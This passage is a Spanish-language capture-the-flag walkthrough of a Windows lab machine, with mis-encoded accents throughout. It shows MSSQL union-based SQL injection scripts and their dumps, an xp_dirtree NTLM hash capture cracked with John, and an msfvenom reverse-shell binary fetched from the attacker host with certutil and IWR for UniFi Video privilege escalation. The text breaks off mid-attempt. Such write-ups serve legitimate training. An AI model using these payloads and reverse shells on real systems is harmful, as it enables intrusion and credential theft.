Starting: [25:25:25] 301 - 157B - /aspnet_client -&gt; http://10. 10. 10. 104/aspnet_client/[25:25:25] 302 - 157B - /remote -&gt; /Remote/default. aspx?ReturnUrl=%2fremote[25:25:25] 301 - 157B - /Aspnet_client -&gt; http://10. 10. 10. 104/Aspnet_client/[25:25:25] 301 - 147B - /mvc -&gt; http://10. 10. 10. 104/mvc/[25:25:25] 301 - 157B - /aspnet_Client -&gt; http://10. 10. 10. 104/aspnet_Client/[25:25:25] 302 - 157B - /Remote -&gt; /Remote/default. aspx?ReturnUrl=%2fRemote[25:25:25] 301 - 157B - /ASPNET_CLIENT -&gt; http://10. 10. 10. 104/ASPNET_CLIENT/[25:25:25] 400 - 324B - /besalu%09[25:25:25] 400 - 324B - /error%1F_log. . . Opaa, encontramos tres rutas:  /aspnet_client.  /remote.  /mvc. Validando cada una, /aspnet_client nos devuelve acceso denegado :( si revisamos /remote, con ella si obtenemos respuesta y caemos ac√°: Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio HTTPS, as√≠ que nos movemos a:  https://10. 10. 10. 104/remoteY conseguimos el mismo output, pero sin el error del SSL (: Juguemos con el login a ver‚Ä¶  Windows PowerShell Web Access (que llamaremos PSWA): ‚Äúacts as a Windows PowerShell gateway, providing a web-based Windows PowerShell console that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device. ‚Äù Install and Use Windows PowerShell Web Access.  How to use Microsoft PowerShell Web Access. Intentando algunas cositas como buscar Windows PowerShell Web Access exploit o credenciales por default, no conseguimos nada √∫til. Si nos fijamos ya sea con la extensi√≥n Wappalyzer de Firefox o con la herramienta whatweb vemos algo de asp. net: ‚ù± whatweb https://10. 10. 10. 104/remotehttps://10. 10. 10. 104/remote [302 Found] ASP_NET[4. 0. 30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[/Remote/default. aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]https://10. 10. 10. 104/Remote/default. aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4. 0. 30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[/Remote/en-US/logon. aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]https://10. 10. 10. 104/Remote/en-US/logon. aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4. 0. 30319], Cookies[. redirect. ], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], HttpOnly[. redirect. ], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[https://10. 10. 10. 104/Remote/en-US/logon. aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]Contamos con la versi√≥n 4. 0. 30319 de asp. net, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :( ‚Ä¶ Veamos la ruta /mvc de la web: Ufff, muchos recursos (si nos fijamos a la derecha del todo a√∫n quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:  Un bot√≥n de registro: http://10. 10. 10. 104/mvc/Account/Register. aspx.  Un bot√≥n de login: http://10. 10. 10. 104/mvc/Account/Login. aspx.  4 botones m√°s, los 4 funcionales:     http://10. 10. 10. 104/mvc/About. aspx.    http://10. 10. 10. 104/mvc/Contact. aspx.    http://10. 10. 10. 104/mvc/Search. aspx.     Los links que hacen referencia a nombres de productos tienen este formato:     http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=12, donde 12 puede ser cualquier n√∫mero (o sea, cualquier producto).    Vaya, varias cositas para probar (eso de los productos tiene una cara de SQLi que ufff), pero vamos por orden. Si nos creamos una cuenta, nos inicia sesi√≥n de una. Curiosamente no hay nada distinto a lo que vimos ya. Jugando con el apartado Search. aspx tenemos: Si insertamos algo como &lt;h1&gt;Hola&lt;/h1&gt;, para saber si podemos inyectar c√≥digo HTML nos responde esto: Nos devuelve un error, pero adem√°s de eso vemos varias cositas, como una ruta absoluta y algunas versiones que est√°n siendo usadas con el servicio. Probando algo m√°s interesante como inyectar consultas SQL no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:       Payload   Descripci√≥n         1 order by 100   As√≠ intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos 100 columnas, si no existe ese n√∫mero de columnas nos deber√≠a responder con un error, si llega el error sabemos que es vulnerable y debemos empezar a restar al 100 para encontrar el n√∫mero de columnas (cuando ya no existan errores, tendremos el num de cols).        1 or sleep(5)   Para ver si existe una vulnerabilidad SQL basada en tiempo (si la consulta se demora 5 segundos en responder, sabr√≠amos que es vulnerable).        ;#   Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este despu√©s de nuestro payload como comentario para que no interfiera con nuestra explotaci√≥n   Pero lo dicho, jugando con Search. aspx con algunos payloads no llegamos a ning√∫n lado, as√≠ que mov√°monos a los productos. Seleccionamos cualquiera, por ejemplo el 33 que hace referencia a las luces: Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo: http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 100;# 33, 1, 2 o 234, da igual el numero.  Opaaaaaaa, confirmamos inyecci√≥n SQL (: vemos el error que nos indica que 100 est√° fuera de rango del n√∫mero de columnas, as√≠ que debemos empezar a bajar el n√∫mero y ver en que momento dejamos de ver el error.  Tambi√©n vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la SQLi‚Ä¶  Y un nuevo usuario, jnogueira, guardemoslo. ‚Ä¶ Jugamos con la inyecci√≥n SQL #: Encontramos n√∫mero de columnas usando ORDER BY üîó: Moviendo n√∫meros encontramos el l√≠mite: http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 26;# http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 25;# Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cu√°l de ellas logramos almacenar valores. Descubrimos en cu√°les podemos almacenar texto üîó:  Ac√° una gu√≠a de lo que debemos hacer - SQL injection UNION attacks. Bien, pues cre√©monos un script superr√°pido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por alg√∫n texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendr√≠amos una columna para jugar:  search_column_union. py ‚ù± python3 search_column_union. py [+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '2' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '3' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '6' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '11' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '12' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '13' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '16' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '17' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '18' de nuestro payload nos permite escribir en la webPerfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomar√© la columna n√∫mero 2 (: Antes de ponernos a dumpear las bases de datos debemos saber contra qu√© servicio SQL estamos enfrent√°ndonos (algunos ya lo sabr√°n por los errores), para esto juguemos con la variable @@version y veamos: Vemos la versi√≥n del servicio SQL üîó: Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versi√≥n y as√≠ saber con qu√© sintaxis tenemos que seguir la explotaci√≥n: 33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,. . ,. . ,. . ;-- -Entonces como respuesta, en la web ver√≠amos ELcampoQUEqueremosVERdeLAdb:  Variables - extract_data_sqli. py Si lo ejecutamos vemos: ‚ù± python3 extract_data_sqli. py -f '@@version'[+] Extrayendo la variable @@version del servicio SQL. [+] @@version:   Microsoft SQL Server 2016 (SP1) (KB3182545) - 13. 0. 4001. 0 (X64)     Oct 28 2016 18:17:30     Copyright (c) Microsoft Corporation    Express Edition (64-bit) on Windows Server 2016 Standard 6. 3 &lt;X64&gt; (Build 14393: ) (Hypervisor)Opa, estamos ante el servicio de bases de datos Microsoft SQL Server, pues ahora sabemos que no podemos usar las mismas sentencias que usamos con MySQL; es mi primer approach contra este servicio y su explotaci√≥n, as√≠ que vamos a darle duro y aprendemos juntos. Investigando encontramos varios recursos, podemos destacar 2:  MSSQL Injection Cheat Sheet.  MSSQL Practical Injection Cheat Sheet.  Step By Step MSSQL Union Based Injection. Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual: ‚ù± python3 extract_data_sqli. py -f 'user_name()'[+] Extrayendo la variable user_name() del servicio SQL. [+] user_name(): Giddy\stacy‚ù± python3 extract_data_sqli. py -f 'user'[+] Extrayendo la variable user del servicio SQL. [+] user: Giddy\stacy‚ù± python3 extract_data_sqli. py -f 'system_user'[+] Extrayendo la variable system_user del servicio SQL. [+] system_user: giddy\stacyListones, tenemos al usuario stacy para guardarlo en nuestros pensamientos, ahora s√≠, empecemos a explotar estooooooooooooooooooo!! Extraemos las bases de datos actuales del servicio MSSQL üîó: Con ayuda del primer recurso referenciado antes, vemos una manera de extraer todas las bases de datos: Juguemos con la √∫ltima l√≠nea, armemos un bucle por ejemplo de 10 bases de datos y veamos que surge: (Es pr√°cticamente igual a nuestra inyecci√≥n por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan) 33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,. . ,. . ,. . ORDER BY 1;-- -Le indicamos el ORDER BY 1 para que lo que nos devuelva lo posicione en la primera columna (as√≠ nos es m√°s f√°cil jugar con el script).  Databases - extract_data_sqli. py Ejecutamos yyyyyy: ‚ù± python3 extract_data_sqli. py[+] Extrayendo las bases de datos del servicio MSSQL. [+] Base de datos [0]: Injection[+] Base de datos [1]: master[+] Base de datos [2]: tempdb[+] Base de datos [3]: model[+] Base de datos [4]: msdbBien, 5 bases de datos, juguemos inicialmente con Injection (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene: Extraemos las tablas de la base de datos Injection üîó: Ac√° ya empezamos a limitar los resultados a 1 por fila, as√≠ lo √∫nico que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.  S√© que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio m√°s sencillo de implementar uno por uno. 33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. information_schema. tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -Donde nos extraer√° el nombre de las tablas que hay en la DB nombreDB, esto obtenido de la consulta information_schema. tables PEEEEEEERO en vez de LIMIT (como MySQL) usamos OFFSET y FETCH para limitar los resultados. Lo que hacemos es decirle:  ‚ÄúHEEEEY, limitame los resultados a solo uno (FETCH FIRST 1 ROWS ONLY) y ve cambiando la fila en la que te encuentras por favor (OFFSET N (donde N va de 0 a 1 a 2 y al numero que sea))‚Äù  Tomado de How to Limit Rows in a SQL Server Result Set.  Tables - extract_data_sqli. py ‚ù± python3 extract_data_sqli. py --dump Injection[+] Dumpeando tablas de la base de datos 'Injection': ‚úî+----------------------+| Tablas DB: Injection |+----------------------+| CreditCard      || Product       || ProductCategory   || ProductSubcategory  |+----------------------+Jmmm, 4 no m√°s, veamos la tabla CreditCard a ver que columnas tiene: Extraemos las columnas en la tabla CreditCard de la base de datos Injection üîó: Exactamente igual, solo que agregamos contra que tabla queremos trabajar: 33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. information_schema. columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -Lo √∫nico que cambia es que extraemos las columnas de la DB nombreDB peeero que est√©n relacionadas con la tabla nombreTABLA, nada m√°s.  Columns - extract_data_sqli. py ‚ù± python3 extract_data_sqli. py --dump Injection CreditCard[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ‚úî+--------------+| Columnas   |+--------------+| CardNumber  || CardType   || CreditCardID || ExpMonth   || ExpYear   || ModifiedDate |+--------------+Ninguna columna es llamativa, jmmm, sin embargo intentemos ver alg√∫n valor, por ejemplo el de CardType: Vemos la data de la columna CardType en la tabla CreditCard de la base de datos Injection üîó: Y la m√°s sencilla, solo le indicamos de donde queremos extraer QU√â data. 33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. . nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -Sencillito, le decimos: ‚Äúextrae el campo nombreCAMPO de la tabla nombreTABLA que est√° en la DB nombreDB, muchas gracias‚Äù.  Dump data - extract_data_sqli. py ‚ù± python3 extract_data_sqli. py --dump Injection CreditCard CardType[+] Extrayendo valores de la columna 'CardType' en Injection. CreditCard: ‚úî+---------------+| CardType   |+---------------+| ColonialVoice || Distinguish  || SuperiorCard || Vista     |+---------------+Pos si, los tipos de tarjetas de cr√©dito üòë Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cu√°les encontramos algo √∫til‚Ä¶ ‚Ä¶ Jugando con comandos de MSSQL üîó: Despu√©s de una ardua enumeraci√≥n no encontramos nada de nada :(  Al menos nos sacamos un lindo lindo script. Buscando de que otras maneras podemos aprovecharnos de esta inyecci√≥n, llegamos a esta gran lista de payloads para usar:  PayloadAllTheThings - MSSQL Injection. En √©l hay algunas maneras de ejecutar comandos con la instrucci√≥n xp_cmdshell, pero probando cositas no obtenemos respuestas :( ‚úò Extraemos hash Net-NTLMv2 del usuario Stacy üîó: Si seguimos bajando llegamos al apartado MSSQL UNC Path, el cual nos indica que MSSQL soporta el listado de archivos que existan en un directorio compartido a trav√©s de SMB, esto mediante la instrucci√≥n xp_dirtree. Esto es interesante porque si logramos que el usuario de la base de datos (Stacy) haga la conexi√≥n contra nuestro folder compartido, llegara con ella un hash como m√©todo de autenticaci√≥n, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contrase√±a que hay por detr√°s.  Explicaci√≥n concreta de los tipos de hashes: LM, NTLM y Net-NTLMv2. Bien, pues compartamos una carpeta, usemos smbclient. py: ‚ù± smbserver. py smbFolder $(pwd)La carpeta compartida se llama smbFolder y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucci√≥n a ver si llega alguna conexi√≥n: ‚ù± python3 extract_data_sqli. py --command  use master; exec xp_dirtree '\\\10. 10. 14. 5\smbFolder' [+] Enviando: . . . =33; use master; exec xp_dirtree '\\10. 10. 14. 5\smbFolder';-- -[+] Listonessss. Si revisamos nuestra carpeta vemos una conexi√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥n: Sip, Stacy hace dos conexiones por lo tanto vemos dos hashes, si nos guiamos del recurso anteriormente citado sabemos que es un hash Net-NTLMv2, podemos jugar con John The Ripper e intentar crackearlo: Lo guardamos en un archivo: ‚ù± cat stacy. hash Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000Y ahora con john: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=netntlmv2 stacy. hash Pero la respuesta nos deja muertos:  No password hashes loaded (see FAQ) ‚úî Extraemos hash Net-NTLMv2 del usuario Stacy üîó: Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada responder, la cual (entre muuuchas cosas) tambi√©n nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto: Al ser la primera vez que lo uso, debemos descargarlo:  Vamos al repo de la tool.  En nuestra terminal hacemos git clone https://github. com/lgandx/Responder. git.  Y ya tendr√≠amos el programa Responder. py, lo renombrar√© a responder. py para que sea m√°s sencillo el llamado (que pereza escribir la primera en mayus üòä)En internet encontramos este recurso que nos muestra como usar Responder para capturar hashes NetNTLM. Si queremos validar el tr√°fico de alguna interfaz, por ejemplo de la tun0, que seria donde esta HTB: ‚ù± ifconfig docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500    . . . eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500    . . . lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536    . . . tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500    inet 10. 10. 14. 5 netmask 255. 255. 254. 0 destination 10. 10. 14. 5    . . . Y ahora ejecutar√≠amos con el responder que analice el tr√°fico de esa interfaz: ‚ù± responder. py -I tun0 -A Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz tun0: Ahora bien, para capturar el hash de Stacy (que es el user que hace la petici√≥n) debemos quitar el par√°metro -A: ‚ù± responder. py -I tun0Lo siguiente ser√° enviar una petici√≥n desde el servicio MSSQL a nuestra IP servida en la interfaz tun0, o sea, a la 10. 10. 14. 5 y ver que pasa en el responder: ‚ù± python3 extract_data_sqli. py --command  use master; exec xp_dirtree '\\\10. 10. 14. 5' [+] Enviando: . . . =33; use master; exec xp_dirtree '\\10. 10. 14. 5';-- -[+] Listonessss. Yyyyyyyyyyyyy: Bien, tambi√©n obtenemos el hash Net-NTLMv2 de Stacy, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con john: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=netntlmv2 stacy. hash PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora s√≠ logramos que tome el hash y mejor a√∫n, que lo crackeeeeeeeeeeeeeeeeeeee.  Que locura, lindo lindo‚Ä¶ Si recordamos en nuestro escaneo de nmap, el servicio WinRM por el puerto 5985 esta activo, entre las cosas que podemos hacer con √©l, ah√≠ un recurso que lo aprovecha para generar una consola PowerShell llamado evil-winrm, us√©moslo y de una validemos si las credenciales son funcionales: Listones ahora s√≠, estamos dentro del sistema como el usuario Stacy (: ‚Ä¶ Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeraci√≥n web, la recuerdan? Hab√≠a un recurso llamado Remote, si intentamos logearnos con esas credenciales, conseguimos una PowerShell en la web (que va un toque m√°s r√°pida que la que tenemos con evil-winrm):  Con este recurso vemos un ejemplo de uso de la interfaz web.  Si una nos falla o algo as√≠, ya tenemos un respaldo :P sigamos‚Ä¶ ‚Ä¶ Escalada de privilegios #: En el directorio en el que salimos cuando obtenemos nuestra PowerShell vemos un archivo con un nombre algo extra√±o: *Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir  Directory: C:\Users\Stacy\DocumentsMode        LastWriteTime     Length Name----        -------------     ------ -----a----    6/17/2018  9:36 AM       6 unifivideo. . . Me dio curiosidad y busqu√© que era eso, la curiosidad nos dio vida:  ‚Äúunifi-video‚Äù, tambien llamado ‚ÄúUniFi‚Äù es una solucion de video vigilancia, o sea, de camaras de seguridad. Si le agregamos a nuestra b√∫squeda  exploit  vemos algo interesante: Lindo, un exploit que nos permite escalar privilegios, es m√°s o menos viejito (concuerda con las fechas de la m√°quina) as√≠ que ve√°moslo a ver que nos comenta.  Ubiquiti UniFi Video 3. 7. 3 - Local Privilege Escalation. Tenemos varias cosas a destacar:  Ubiquiti UniFi Video for Windows is installed to C:\ProgramData\\unifi-video\ by default. Validemos si efectivamente existe la ruta y tiene el contenido del programa: *Evil-WinRM* PS C:\Users\Stacy\Documents&gt; dir C:\ProgramData\\unifi-video\  Directory: C:\ProgramData\\unifi-videoMode        LastWriteTime     Length Name----        -------------     ------ ----d-----    6/16/2018  9:54 PM        bind-----    6/16/2018  9:55 PM        confd-----    6/16/2018 10:56 PM        datad-----    6/16/2018  9:54 PM        emaild-----    6/16/2018  9:54 PM        fwd-----    6/16/2018  9:54 PM        libd-----    7/26/2018 11:23 AM        logsd-----    6/16/2018  9:55 PM        webappsd-----    6/16/2018  9:55 PM        work-a----    7/26/2017  6:10 PM     219136 avService. exe-a----    6/17/2018 11:23 AM     31685 hs_err_pid1992. log-a----    6/17/2018 11:23 AM   534204321 hs_err_pid1992. mdmp-a----    8/16/2018  7:48 PM     270597 hs_err_pid2036. mdmp-a----    6/16/2018  9:54 PM      780 Ubiquiti UniFi Video. lnk-a----    7/26/2017  6:10 PM     48640 UniFiVideo. exe-a----    7/26/2017  6:10 PM     32038 UniFiVideo. ico-a----    6/16/2018  9:54 PM     89050 Uninstall. exe. . . Perfecto, vamos bien :)  Default permissions on the C:\ProgramData\\unifi-video folder are inherited from C:\ProgramData and are not explicitly overridden, which allows all users, even unprivileged ones, to append and write files to the application directory. Validemos si es cierto que tenemos permisos de escritura con ayuda de icacls: *Evil-WinRM* PS C:\ProgramData&gt; icacls unifi-videounifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)      BUILTIN\Administrators:(I)(OI)(CI)(F)      CREATOR OWNER:(I)(OI)(CI)(IO)(F)      BUILTIN\Users:(I)(OI)(CI)(RX)      BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)Successfully processed 1 files; Failed processing 0 filesPues si, como BUILTIN\Users tenemos varios permisos, pero los interesantes son:  WD: ‚Äúescribir datos/agregar archivo‚Äù.  AD: ‚Äúanexar datos/agregar subdirectorio‚Äù. Les dejo una lista de los permisos que encontramos y su significado. Vamos a√∫n mejor, veamos de que nos sirve saber esto:  Upon start and stop of the service, it tries to load and execute the file at C:\ProgramData\\unifi-video\taskkill. exe. However this file does not exist in the application directory by default at all. Y llega el remate:  By copying an arbitrary taskkill. exe to C:\ProgramData\\unifi-video\ as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM. :o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de msfvenom llamado taskkill. exe y posicionarlo en la ruta C:\ProgramData\\unifi-video\. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo taskkill. exe, lo ejecute y ver como obtenemos nuestra Shell (: D√©mosleeeeeeeeeeeeeeeeeeeeeeeeeeeee. ‚Ä¶ Generamos archivo taskkill. exe malicioso üîó: Creemos nuestro binario taskkill. exe con ayuda de msfvenom, le indicaremos que una vez se ejecute env√≠e una petici√≥n hacia X puerto con una CMD, o sea, generamos una Reverse Shell: ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 5 LPORT=4433 -f exe &gt; taskkill. exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesListo, ya lo tenemos, sigamos‚Ä¶ Buscamos servicio relacionado con unifi-video üîó: Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar espec√≠ficamente alguno relacionado con unifi-video. Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores: *Evil-WinRM* PS C:\ProgramData&gt; net startnet. exe : System error 5 has occurred. . . . Access is denied. *Evil-WinRM* PS C:\ProgramData&gt; wmic service list briefWMIC. exe : ERROR:. . . Description = Access denied*Evil-WinRM* PS C:\ProgramData&gt; Get-ServiceCannot open Service Control Manager on computer '. '. This operation might require other privileges. . . .  Tomadas de Hacktricks. xyz - WinPrivEsc/Services. As√≠ que tamos tristes :( Buscando en internet maneras de detener o iniciar procesos con PowerShell, encontramos dos herramientas:  Powershell: How to Start (start-service) or Stop (stop-service) services. Pero seguimos igual, no sabemos el nombre del servicio‚Ä¶ Probando algunos randoms siempre recibimos un error, por ejemplo buscando unifi-video como nombre de servicio: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service  unifi-video Cannot find any service with service name 'unifi-video'. . . . :( Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre Ubiquiti UniFi Video: As√≠ que podemos probar con ese nombre, si no nos funciona ya tendr√≠amos una base para quitar, agregar, modificar o juntar palabras en busca de alg√∫n nombre para el servicio. *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service  Ubiquiti UniFi Video Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . OPAAAAAAAAAAAAAAA, si se√±orrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra reverse Shell: Subimos el binario al sistema de diferentes maneras üîó: Aprovechemos y subamos el binario de 3 formas, con certutil. exe, con una de las opciones de PowerShell yyy con ayuda de una carpeta compartida por SMB: Levantemos un servidor web con Python en la ruta donde tenemos el archivo taskkill. exe: ‚ù± python3 -m http. servercertutil. exe:*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; certutil. exe -f -urlcache -split http://10. 10. 14. 5:8000/taskkill. exe taskkill. exe**** Online **** 000000 . . .  01204aCertUtil: -URLCache command completed successfully. Y ya lo tendriamos (: Usando la clase InvokeWebRequest de PowerShell:*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/taskkill. exe -OutFile taskkill. exeY tambien ya tendriamos el binario en la m√°quina victima. Compartiendo una carpeta con SMB:‚ù± smbserver. py smbFolder $(pwd)Ya tendr√≠amos nuestra carpeta compartida llamada smbFolder situada en la ruta del binario taskkill. exe, ahora desde la m√°quina v√≠ctima le decimos que se conecte a esa carpeta, pero que adem√°s haga una copia de uno de sus archivos a la ruta actual: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; copy \\10. 10. 14. 5\smbFolder\taskkill. exe taskkill. exeRecibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo taskkill. exe (: Listos, ahora si explotemos estooooo. Pongamonos en escucha por el puerto 4433 que fue el que indicamos en nuestro binario malicioso: ‚ù± nc -lvp 4433Intentamos que el servicio unifi-video ejecute el binario malicioso üîó: Jugando con el binario y el servicio:  Stop-Service  Ubiquiti UniFi Video  Start-Service  Ubiquiti UniFi Video No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra taskkill. exe, si intentamos nosotros mismo ejecutarlo obtenemos esto: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; . \taskkill. exeProgram 'taskkill. exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1. . . Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo √©s :P) y por consiguiente esta siendo borrado‚Ä¶ Esto puede ser obra del antivirus, 